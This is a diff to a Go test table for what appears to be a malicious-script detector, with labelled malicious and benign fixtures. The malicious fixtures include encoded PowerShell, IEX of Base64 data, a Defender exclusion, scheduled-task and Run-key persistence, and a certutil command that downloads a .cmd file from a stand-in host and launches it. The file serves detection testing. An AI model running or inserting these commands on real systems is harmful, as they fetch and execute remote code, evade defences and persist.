@@ -49,7 +49,7 @@ func TestSyntheticDetectionQuality(t *testing.T){
  {"encoded-command","encoded.bat",[]byte("powershell -NoProfile -enc AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"),nil,true},
  {"base64-execute","decode.ps1",[]byte("IEX ([Convert]::FromBase64String('AAAA'))"),nil,true},
  {"defender exclusion","defender.ps1",[]byte("Add-MpPreference -ExclusionPath 'C:\\example'"),nil,true},
- {"certutil retrieval","download.cmd",[]byte("certutil -urlcache -f http://example.invalid/n test.dat"),nil,true},
+ {"certutil remote retrieval followed by launch","download.cmd",[]byte("certutil -urlcache -f http://example.invalid/n.cmd %TEMP%\\review.cmd\nstart %TEMP%\\review.cmd"),nil,true},
  {"scheduled task","task.cmd",[]byte("schtasks /create /tn sample /tr powershell.exe"),nil,true},
  {"Run key persistence","run.vbs",[]byte("WScript.Shell RegWrite \\CurrentVersion\\Run"),nil,true},
  {"ZIP double extension","archive.zip",nil,map[string][]byte{"picture.png.exe":[]byte("inert")},true},
@@ -74,6 +74,7 @@ func TestSyntheticDetectionQuality(t *testing.T){
  {"normal JAR","app.jar",[]byte("META-INF"),nil,false},
  {"normal JS","app.js",[]byte("fetch('/api/status')"),nil,false},
  {"normal MSI","app.msi",[]byte("inert"),nil,false},
+ {"certutil transfer without execution","transfer.cmd",[]byte("certutil -urlcache -f https://example.invalid/docs.txt %TEMP%\\docs.txt"),nil,false},
  {"certutil hash","hash.cmd",[]byte("certutil -hashfile report.pdf SHA256"),nil,false},
  }
  // Stage 12 reclassifies the inert process-name-only fixture as benign.
